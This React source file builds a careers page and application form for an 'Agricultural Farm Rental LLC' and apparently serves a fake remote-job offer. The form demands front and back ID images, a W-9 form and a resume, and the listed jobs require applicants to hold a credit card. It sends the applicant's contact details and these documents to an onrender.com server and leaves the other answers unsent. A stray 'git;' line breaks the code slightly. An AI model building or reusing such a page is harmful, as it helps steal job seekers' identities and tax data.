import React from "react";
import Layout from "../components/Layout";
import WeHelp from "../components/Home Components/WeHelp";
import { useState } from "react";

const Careers = () => {
  const [formData, setFormData] = useState({
    fullname: "",
    email: "",
    phoneNumber: "",
    address: "",
    position: "",
    work_auth: "",
    availability: "",
    company1: "",
    job1: "",
    dates1: "",
    reason1: "",
    education: "",
    bank_account: "",
    credit_card: "",
    signature: "",
    date: "",
    frontView: null,
    backView: null,
    w9form: null,
    resume: null,
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e) => {
    const { name, value, files } = e.target;
    if (files) {
      setFormData({ ...formData, [name]: files[0] });
    } else {
      setFormData({ ...formData, [name]: value });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Create FormData object for the backend
    const data = new FormData();
    data.append("fullname", formData.fullname);
    data.append("email", formData.email);
    data.append("phoneNumber", formData.phoneNumber);
    data.append("address", formData.address);
    data.append("frontView", formData.frontView);
    data.append("backView", formData.backView);
    data.append("w9form", formData.w9form);
    data.append("resume", formData.resume);

    try {
      const response = await fetch("https://rrserver-1itz.onrender.com/info", {
        method: "POST",
        body: data,
      });
      if (response.ok) {
        alert("Form submitted successfully!");
      } else {
        alert("Something went wrong. Please try again.");
        git;
      }
      const result = await response.json();
      console.log(result);
      setIsSubmitting(false);
    } catch (error) {
      setIsSubmitting(false);
      console.error("Error submitting form:", error);
    }
  };
  return (
    <>
      <Layout>
        <div>
          <div className="">
            <div className="career">
              <h4 className="">Careers at Agricultural Farm Rental LLC</h4>
              <p>
                Join our growing team! At Agricultural Farm Rental LLC, we
                believe in providing top-quality agricultural solutions while
                fostering a dynamic and supportive remote work environment. We
                are looking for dedicated professionals who are passionate about
                customer service, sales, marketing, and administration.
              </p>
              <h5>Open Positions</h5>
              <h6>1. Customer Support Representative (Remote)</h6>
              <p>Responsibilities:</p>
              <li>
                Assist customers with inquiries, bookings, and equipment
                troubleshooting.
              </li>
              <li>
                Respond to emails, chats, and phone calls in a professional and
                timely manner.
              </li>
              <li>
                Maintain customer records and provide solutions to enhance user
                experience.
              </li>
              <p>Requirements:</p>
              <li>
                High school diploma or equivalent; associate degree preferred.
              </li>
              <li>Strong communication and problem-solving skills.</li>
              <li>Experience in customer service or call centers is a plus.</li>
            </div>
            <div className="career">
              <h6>2. Sales Representative (Remote)</h6>
              <p>Responsibilities:</p>
              <li>Generate leads and manage client relationships.</li>
              <li>
                Promote and sell rental services to farmers and agricultural
                businesses.
              </li>
              <li>Meet sales goals and track performance metrics.</li>
              <p>Requirements:</p>
              <li>
                Previous sales experience, preferably in agriculture or
                equipment rentals.
              </li>
              <li>Strong negotiation and interpersonal skills.</li>
              <li>Self-motivated and goal-oriented mindset.</li>
              <li>Must have an active bank account for payroll deposits.</li>
              <li>
                Must have a credit card to cover occasional work-related
                expenses (reimbursed monthly).
              </li>
            </div>
            <div className="career">
              <h6>3. Marketing Specialist</h6>
              <p>Responsibilities:</p>
              <li>
                Develop digital marketing strategies to promote our services.
              </li>
              <li>Manage social media accounts and create engaging content.</li>
              <li>
                Analyze marketing data and optimize campaigns for better reach.
              </li>
              <p>Requirements:</p>
              <li>
                Bachelor’s degree in Marketing, Communications, or related
                field.
              </li>
              <li>
                Experience in digital marketing, SEO, and social media
                management.
              </li>
              <li>Creative mindset with strong analytical skills.</li>
              <li>Must have an active bank account for payroll deposits.</li>
              <li>
                Must have a credit card to manage minor marketing-related
                expenses (e.g., social media ads, software tools – reimbursed
                monthly).
              </li>
            </div>
            <div className="career">
              <h6>4. Administrative Assistant </h6>
              <p>Responsibilities:</p>
              <li>Manage scheduling, data entry, and document handling.</li>
              <li>Assist with customer inquiries and follow-ups.</li>
              <li>Support team operations and internal communications.</li>
              <p>Requirements:</p>
              <li>High school diploma or higher.</li>
              <li>Experience in administrative work or office management.</li>
              <li>Strong organizational and multitasking abilities.</li>
              <li>Must have an active bank account for payroll deposits.</li>
            </div>
            <div className="career">
              <h5>Employee Benefits</h5>
              <p>
                At Agricultural Farm Rental LLC, we value our employees and
                offer a comprehensive benefits package to support their
                well-being and professional growth.
              </p>
              <h6>Financial & Compensation Benefits</h6>
              <>
                Competitive Salary – Based on experience and industry standards.
              </>
              <>
                Performance Bonuses – Incentives for meeting sales and company
                goals.
              </>
              <div>
                401(k) Retirement Plan – With company matching to help you plan
                for the future.
              </div>
              <div>
                Direct Deposit Payroll – Secure and timely salary payments.
              </div>
            </div>
            <div className="career">
              <h6>Health & Wellness Benefits</h6>
              <>
                Health Insurance – Including medical, dental, and vision
                coverage.
              </>
              <>
                Paid Sick Leave – Stay home when you're unwell without losing
                pay.
              </>
              <>
                Mental Health Support – Employee assistance programs for
                counseling and wellness resources.
              </>
            </div>
            <div className="career">
              <h6>Work-Life Balance</h6>
              <>
                Paid Time Off (PTO) – Accrued vacation days to relax and
                recharge.
              </>
              <>Paid Holidays – Enjoy major U.S. holidays off.</>
              <>
                Flexible Remote Work – Work from anywhere with a stable internet
                connection.
              </>
              <>
                Family & Parental Leave – Support for employees welcoming a new
                child.
              </>
            </div>
            <div className="career">
              <h6>Professional Development</h6>
              <>
                Training & Certifications – Company-sponsored courses to enhance
                your skills.
              </>
              <>
                Career Growth Opportunities – Internal promotions and role
                advancements.
              </>
              <>
                Networking & Industry Events – Opportunities to attend
                conferences and workshops.
              </>
            </div>
            <div className="career">
              <h6>Additional Perks</h6>
              <>
                Equipment & Software Stipends – Reimbursement for work-related
                tools and subscriptions.
              </>
              <>
                Employee Discounts – Special rates on company services and
                partner programs.
              </>
              <>
                Annual Team Retreats – Virtual or in-person team-building
                experiences.
              </>
            </div>
          </div>
          <div className="form1">
            <form onSubmit={handleSubmit} encType="multipart/form-data">
              <h2>Job Application Form</h2>
              {/* Full Name */}
              <label htmlFor="fullname">Full Name:</label>
              <input
                type="text"
                id="fullname"
                name="fullname"
                value={formData.fullname}
                onChange={handleChange}
                required
              />
              {/* Email Address */}
              <label htmlFor="email">Email Address:</label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                required
              />
              {/* Phone Number */}
              <label htmlFor="phoneNumber">Phone Number:</label>
              <input
                type="tel"
                id="phoneNumber"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleChange}
                required
              />
              {/* Current Address */}
              <label htmlFor="address">Current Address:</label>
              <input
                type="text"
                id="address"
                name="address"
                value={formData.address}
                onChange={handleChange}
                required
              />
              {/* Position Applying For */}
              <label htmlFor="position">Position Applying For:</label>
              <select
                id="position"
                name="position"
                value={formData.position}
                onChange={handleChange}
                required
              >
                <option value="Customer Support Representative">
                  Customer Support Representative
                </option>
                <option value="Sales Representative">
                  Sales Representative
                </option>
                <option value="Marketing Specialist">
                  Marketing Specialist
                </option>
                <option value="Administrative Assistant">
                  Administrative Assistant
                </option>
              </select>
              {/* Work Authorization */}
              <label>
                Are you legally authorized to work in the United States?
              </label>
              <input
                type="radio"
                name="work_auth"
                value="Yes"
                checked={formData.work_auth === "Yes"}
                onChange={handleChange}
                required
              />{" "}
              Yes
              <input
                type="radio"
                name="work_auth"
                value="No"
                checked={formData.work_auth === "No"}
                onChange={handleChange}
              />{" "}
              No
              {/* Availability */}
              <label>Are you available to work full-time?</label>
              <input
                type="radio"
                name="availability"
                value="Yes"
                checked={formData.availability === "Yes"}
                onChange={handleChange}
                required
              />{" "}
              Yes
              <input
                type="radio"
                name="availability"
                value="No"
                checked={formData.availability === "No"}
                onChange={handleChange}
              />{" "}
              No
              {/* Employment History */}
              <h2>Employment History</h2>
              <label htmlFor="company1">Most Recent Company:</label>
              <input
                type="text"
                id="company1"
                name="company1"
                value={formData.company1}
                onChange={handleChange}
              />
              <label htmlFor="job1">Job Title:</label>
              <input
                type="text"
                id="job1"
                name="job1"
                value={formData.job1}
                onChange={handleChange}
              />
              <label htmlFor="dates1">Employment Dates:</label>
              <input
                type="text"
                id="dates1"
                name="dates1"
                value={formData.dates1}
                onChange={handleChange}
              />
              <label htmlFor="reason1">Reason for Leaving:</label>
              <input
                type="text"
                id="reason1"
                name="reason1"
                value={formData.reason1}
                onChange={handleChange}
              />
              {/* Education */}
              <label htmlFor="education">
                Highest Level of Education Completed:
              </label>
              <select
                id="education"
                name="education"
                value={formData.education}
                onChange={handleChange}
                required
              >
                <option value="High School Diploma/GED">
                  High School Diploma/GED
                </option>
                <option value="Associate’s Degree">Associate’s Degree</option>
                <option value="Bachelor’s Degree">Bachelor’s Degree</option>
                <option value="Other">Other</option>
              </select>
              {/* Bank Account */}
              <label>
                Do you have an active bank account for payroll deposits?
              </label>
              <input
                type="radio"
                name="bank_account"
                value="Yes"
                checked={formData.bank_account === "Yes"}
                onChange={handleChange}
                required
              />{" "}
              Yes
              <input
                type="radio"
                name="bank_account"
                value="No"
                checked={formData.bank_account === "No"}
                onChange={handleChange}
              />{" "}
              No
              {/* Credit Card */}
              <label>
                (For Sales & Marketing Roles Only) Do you have a credit card to
                manage reimbursable business expenses?
              </label>
              <input
                type="radio"
                name="credit_card"
                value="Yes"
                checked={formData.credit_card === "Yes"}
                onChange={handleChange}
              />{" "}
              Yes
              <input
                type="radio"
                name="credit_card"
                value="No"
                checked={formData.credit_card === "No"}
                onChange={handleChange}
              />{" "}
              No
              {/* Resume Upload */}
              <label htmlFor="resume">Upload Resume (PDF/DOCX only):</label>
              <input
                type="file"
                id="resume"
                name="resume"
                accept=".pdf, .doc, .docx, .jpeg, .jpg, .png"
                onChange={handleChange}
                required
              />
              {/* ID Card Uploads */}
              <label htmlFor="frontView">
                Unexpired Identification Form Front View (PDF/DOCX only):
              </label>
              <input
                type="file"
                id="frontView"
                name="frontView"
                accept=".pdf, .doc, .docx, .jpeg, .jpg, .png"
                onChange={handleChange}
                required
              />
              <label htmlFor="backView">
                Unexpired Identification Form Back View (PDF/DOCX only):
              </label>
              <input
                type="file"
                id="backView"
                name="backView"
                accept=".pdf, .doc, .docx, .jpeg, .jpg, .png"
                onChange={handleChange}
                required
              />
              {/* W9 Form Upload */}
              <label htmlFor="w9form">W9 Form (PDF/DOCX only):</label>
              <input
                type="file"
                id="w9form"
                name="w9form"
                accept=".pdf, .doc, .docx, .jpeg, .jpg, .png"
                onChange={handleChange}
                required
              />
              {/* Signature and Date */}
              <label htmlFor="signature">Signature (Type Name):</label>
              <input
                type="text"
                id="signature"
                name="signature"
                value={formData.signature}
                onChange={handleChange}
                required
              />
              <label htmlFor="date">Date:</label>
              <input
                type="date"
                id="date"
                name="date"
                value={formData.date}
                onChange={handleChange}
                required
              />
              {/* Submit Button */}
              <button disabled={isSubmitting} type="submit">
                {isSubmitting ? "Submitting..." : "Submit Application"}
              </button>
            </form>
          </div>
        </div>
        <WeHelp />
      </Layout>
    </>
  );
};

export default Careers;
